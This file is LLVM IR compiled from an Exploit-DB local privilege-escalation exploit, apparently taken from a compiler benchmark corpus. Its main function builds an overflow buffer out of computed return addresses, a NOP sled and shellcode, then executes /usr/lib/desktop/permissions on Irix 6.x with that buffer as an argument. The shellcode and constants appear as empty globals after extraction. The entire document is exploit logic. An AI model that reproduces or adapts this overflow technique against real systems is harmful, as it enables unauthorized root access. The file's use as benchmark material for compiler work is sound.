; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19318.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19318.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@irix_shellcode = common dso_local global i32* null, align 8
@get_sp_code = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [34 x i8] c"Recompile with the '-n32' option\0A\00", align 1
@buf = common dso_local global i64 0, align 8
@OFFSET = common dso_local global i32 0, align 4
@GP_OFFSET = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [40 x i8] c"Sorry - this exploit for Irix 6.x only\0A\00", align 1
@NUM_ADDRESSES = common dso_local global i32 0, align 4
@BUF_LENGTH = common dso_local global i32 0, align 4
@IRIX_NOP = common dso_local global i32 0, align 4
@EXTRA = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [32 x i8] c"stack = 0x%x, targ_addr = 0x%x\0A\00", align 1
@.str.3 = private unnamed_addr constant [29 x i8] c"/usr/lib/desktop/permissions\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"permissions\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"-display\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"DISPLAY\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"/bin/ls\00", align 1
@.str.8 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [1 x i8*], align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32 ()*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = bitcast [1 x i8*]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %13, i8 0, i64 8, i1 false)
  %14 = load i32*, i32** @irix_shellcode, align 8
  %15 = bitcast i32* %14 to i8*
  %16 = call i32 @strlen(i8* %15)
  %17 = add nsw i32 %16, 1
  store i32 %17, i32* %11, align 4
  %18 = load i32, i32* @get_sp_code, align 4
  %19 = sext i32 %18 to i64
  %20 = inttoptr i64 %19 to i32 ()*
  store i32 ()* %20, i32 ()** %12, align 8
  %21 = load i32 ()*, i32 ()** %12, align 8
  %22 = call i32 %21()
  store i32 %22, i32* %7, align 4
  %23 = load i32, i32* %7, align 4
  %24 = and i32 %23, -2147483648
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %26, label %29

26:                                               ; preds = %2
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0))
  %28 = call i32 @exit(i32 1) #4
  unreachable

29:                                               ; preds = %2
  %30 = load i64, i64* @buf, align 8
  %31 = inttoptr i64 %30 to i32*
  store i32* %31, i32** %9, align 8
  %32 = load i32, i32* %7, align 4
  %33 = load i32, i32* @OFFSET, align 4
  %34 = add nsw i32 %32, %33
  store i32 %34, i32* %6, align 4
  %35 = load i32, i32* %3, align 4
  %36 = icmp sgt i32 %35, 1
  br i1 %36, label %37, label %45

37:                                               ; preds = %29
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @atoi(i8* %40)
  %42 = mul nsw i32 %41, 4
  %43 = load i32, i32* %6, align 4
  %44 = add nsw i32 %43, %42
  store i32 %44, i32* %6, align 4
  br label %45

45:                                               ; preds = %37, %29
  %46 = load i32, i32* %6, align 4
  %47 = load i32, i32* @GP_OFFSET, align 4
  %48 = add nsw i32 %46, %47
  %49 = icmp ugt i32 %48, -2147483648
  br i1 %49, label %50, label %53

50:                                               ; preds = %45
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0))
  %52 = call i32 @exit(i32 1) #4
  unreachable

53:                                               ; preds = %45
  %54 = load i32, i32* %6, align 4
  %55 = load i32, i32* @NUM_ADDRESSES, align 4
  %56 = add nsw i32 %54, %55
  %57 = load i32, i32* @BUF_LENGTH, align 4
  %58 = load i32, i32* %11, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sdiv i32 %59, 2
  %61 = add nsw i32 %56, %60
  %62 = and i32 %61, -4
  store i32 %62, i32* %8, align 4
  br label %63

63:                                               ; preds = %81, %53
  %64 = load i32, i32* %8, align 4
  %65 = and i32 %64, -16777216
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %79, label %67

67:                                               ; preds = %63
  %68 = load i32, i32* %8, align 4
  %69 = and i32 %68, 16711680
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %79, label %71

71:                                               ; preds = %67
  %72 = load i32, i32* %8, align 4
  %73 = and i32 %72, 65280
  %74 = icmp eq i32 %73, 0
  br i1 %74, label %79, label %75

75:                                               ; preds = %71
  %76 = load i32, i32* %8, align 4
  %77 = and i32 %76, 255
  %78 = icmp eq i32 %77, 0
  br label %79

79:                                               ; preds = %75, %71, %67, %63
  %80 = phi i1 [ true, %71 ], [ true, %67 ], [ true, %63 ], [ %78, %75 ]
  br i1 %80, label %81, label %84

81:                                               ; preds = %79
  %82 = load i32, i32* %8, align 4
  %83 = add nsw i32 %82, 4
  store i32 %83, i32* %8, align 4
  br label %63

84:                                               ; preds = %79
  store i32 0, i32* %10, align 4
  br label %85

85:                                               ; preds = %96, %84
  %86 = load i32, i32* %10, align 4
  %87 = sext i32 %86 to i64
  %88 = load i32, i32* @NUM_ADDRESSES, align 4
  %89 = sext i32 %88 to i64
  %90 = udiv i64 %89, 4
  %91 = icmp ult i64 %87, %90
  br i1 %91, label %92, label %99

92:                                               ; preds = %85
  %93 = load i32, i32* %8, align 4
  %94 = load i32*, i32** %9, align 8
  %95 = getelementptr inbounds i32, i32* %94, i32 1
  store i32* %95, i32** %9, align 8
  store i32 %93, i32* %94, align 4
  br label %96

96:                                               ; preds = %92
  %97 = load i32, i32* %10, align 4
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* %10, align 4
  br label %85

99:                                               ; preds = %85
  store i32 0, i32* %10, align 4
  br label %100

100:                                              ; preds = %113, %99
  %101 = load i32, i32* %10, align 4
  %102 = sext i32 %101 to i64
  %103 = load i32, i32* @BUF_LENGTH, align 4
  %104 = load i32, i32* %11, align 4
  %105 = sub nsw i32 %103, %104
  %106 = sext i32 %105 to i64
  %107 = udiv i64 %106, 4
  %108 = icmp ult i64 %102, %107
  br i1 %108, label %109, label %116

109:                                              ; preds = %100
  %110 = load i32, i32* @IRIX_NOP, align 4
  %111 = load i32*, i32** %9, align 8
  %112 = getelementptr inbounds i32, i32* %111, i32 1
  store i32* %112, i32** %9, align 8
  store i32 %110, i32* %111, align 4
  br label %113

113:                                              ; preds = %109
  %114 = load i32, i32* %10, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %10, align 4
  br label %100

116:                                              ; preds = %100
  store i32 0, i32* %10, align 4
  br label %117

117:                                              ; preds = %132, %116
  %118 = load i32, i32* %10, align 4
  %119 = sext i32 %118 to i64
  %120 = load i32, i32* %11, align 4
  %121 = sext i32 %120 to i64
  %122 = udiv i64 %121, 4
  %123 = icmp ult i64 %119, %122
  br i1 %123, label %124, label %135

124:                                              ; preds = %117
  %125 = load i32*, i32** @irix_shellcode, align 8
  %126 = load i32, i32* %10, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i32, i32* %125, i64 %127
  %129 = load i32, i32* %128, align 4
  %130 = load i32*, i32** %9, align 8
  %131 = getelementptr inbounds i32, i32* %130, i32 1
  store i32* %131, i32** %9, align 8
  store i32 %129, i32* %130, align 4
  br label %132

132:                                              ; preds = %124
  %133 = load i32, i32* %10, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %10, align 4
  br label %117

135:                                              ; preds = %117
  %136 = load i32, i32* %6, align 4
  %137 = load i32, i32* @GP_OFFSET, align 4
  %138 = add nsw i32 %136, %137
  %139 = load i32, i32* @NUM_ADDRESSES, align 4
  %140 = sdiv i32 %139, 2
  %141 = add nsw i32 %138, %140
  %142 = and i32 %141, -4
  store i32 %142, i32* %8, align 4
  store i32 0, i32* %10, align 4
  br label %143

143:                                              ; preds = %158, %135
  %144 = load i32, i32* %10, align 4
  %145 = sext i32 %144 to i64
  %146 = load i32, i32* @EXTRA, align 4
  %147 = sext i32 %146 to i64
  %148 = udiv i64 %147, 4
  %149 = icmp ult i64 %145, %148
  br i1 %149, label %150, label %161

150:                                              ; preds = %143
  %151 = load i32, i32* %8, align 4
  %152 = shl i32 %151, 16
  %153 = load i32, i32* %8, align 4
  %154 = ashr i32 %153, 16
  %155 = or i32 %152, %154
  %156 = load i32*, i32** %9, align 8
  %157 = getelementptr inbounds i32, i32* %156, i32 1
  store i32* %157, i32** %9, align 8
  store i32 %155, i32* %156, align 4
  br label %158

158:                                              ; preds = %150
  %159 = load i32, i32* %10, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %10, align 4
  br label %143

161:                                              ; preds = %143
  %162 = load i32*, i32** %9, align 8
  store i32 0, i32* %162, align 4
  %163 = load i32, i32* %7, align 4
  %164 = load i32, i32* %6, align 4
  %165 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i32 %163, i32 %164)
  %166 = call i32 @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0))
  %167 = load i64, i64* @buf, align 8
  %168 = getelementptr inbounds [1 x i8*], [1 x i8*]* %5, i64 0, i64 0
  %169 = call i32 @execle(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i32 %166, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i64 %167, i32 0, i8** %168)
  %170 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0))
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @execle(i8*, i8*, i8*, i32, i8*, i64, i32, i8**) #2

declare dso_local i32 @getenv(i8*) #2

declare dso_local i32 @perror(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
